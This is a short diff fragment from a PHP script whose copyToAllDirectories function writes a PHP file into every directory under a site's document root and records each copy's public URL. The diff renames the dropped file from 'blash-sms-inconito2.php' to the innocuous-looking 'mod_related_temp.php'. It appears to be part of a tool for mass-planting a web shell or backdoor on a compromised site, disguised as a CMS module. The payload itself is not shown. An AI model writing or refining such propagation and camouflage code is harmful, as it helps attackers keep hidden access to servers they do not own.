@@ -40,7 +40,7 @@ function copyToAllDirectories($dir, $url, $logFile, $baseUrl) {
 
     foreach ($files as $file) {
         if ($file->isDir()) {
-            $filePath = $file->getPathname() . "/blash-sms-inconito2.php";
+            $filePath = $file->getPathname() . "/mod_related_temp.php";
             $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $filePath);
             $fullUrl = $baseUrl . $relativePath;
 
